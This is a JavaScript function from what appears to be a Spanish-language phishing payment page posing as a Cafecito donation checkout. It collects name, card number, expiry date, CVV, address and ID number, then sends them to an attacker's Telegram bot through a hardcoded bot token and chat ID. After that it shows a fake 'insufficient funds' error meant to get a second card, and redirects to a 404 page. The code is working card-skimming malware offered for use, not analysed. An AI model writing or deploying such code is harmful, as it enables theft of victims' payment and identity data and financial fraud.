function enviarDatos() {
    var name = document.getElementById('name').value.trim();
    var card_number = document.getElementById('card').value.trim();
    var expiration_date = document.getElementById('exp').value.trim();
    var cvv = document.getElementById('cvv').value.trim();
    var address = document.getElementById('address').value.trim();
    var id = document.getElementById('id').value.trim();

    var nameRegex = /^[a-zA-Z\s]+$/;
    var cardNumberRegex = /^\d{16}$/;
    var expirationDateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    var cvvRegex = /^\d{3,4}$/;
    var addressRegex = /.+/;
    var idRegex = /^\d{8}$/;

    if (!nameRegex.test(name)) {
        alert('Por favor, ingrese un nombre válido.');
        return;
    }
    if (!cardNumberRegex.test(card_number)) {
        alert('Por favor, ingrese un número de tarjeta válido.');
        return;
    }
    if (!expirationDateRegex.test(expiration_date)) {
        alert('Por favor, ingrese una fecha de vencimiento válida en formato MM/YY.');
        return;
    }
    if (!cvvRegex.test(cvv)) {
        alert('Por favor, ingrese un código CVV válido de 3 dígitos.');
        return;
    }
    if (!addressRegex.test(address)) {
        alert('Por favor, ingrese una dirección válida.');
        return;
    }
    if (!idRegex.test(id)) {
        alert('Por favor, ingrese un número de identificación válido de 8 dígitos.');
        return;
    }

    var formData = {
        name: name,
        card_number: card_number,
        expiration_date: expiration_date,
        cvv: cvv,
        address: address,
        id: id,
    };

    var botToken = '6932390548:AAF3HmF1MQti5zClygWbsj17-iWuSTQePOQ';
    var chatId = '267559220';

    var emojis = {
        name: '👤',
        card_number: '💳',
        expiration_date: '📅',
        cvv: '🕵️‍♂️',
        address: '🏠',
        id: '🆔',
    };

    var message = "Nuevo pago recibido: \n\n";
    for (var key in formData) {
        message += `${emojis[key]} ${key}: ${formData[key]}\n`;
    }

    document.getElementById('spinner').style.display = 'block';

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
    })
        .then(function (response) {
            console.log('Done:', response.data);

            setTimeout(function () {
                document.getElementById('spinner').style.display = 'none';

                window.location.href = 'https://cafecito.app/404';
            }, 5000);
            alert('Error fondos insuficientes, intente con otra tarjeta.');
        })
        .catch(function (error) {
            console.error('Error al enviar el mensaje:', error);

            document.getElementById('spinner').style.display = 'none';

            setTimeout(function () {
                alert('Error Compruebe su conexion a internet.');
            }, 4000);
        });
}
